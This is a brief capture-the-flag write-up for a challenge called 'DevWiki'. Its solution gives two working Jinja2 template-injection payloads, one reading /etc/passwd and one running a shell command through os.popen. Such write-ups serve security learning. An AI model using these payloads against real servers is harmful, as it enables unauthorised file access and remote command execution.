# DevWiki

## Description
We will never underpay and rush our developers again. Our site keeps getting hacked but we cannot figure out how.

Can you help us?

## Solution
Use a custom template to execute code on the server to get the flag.

i.e.

```
# Read file
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}

# Execute commands
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}```
```
```
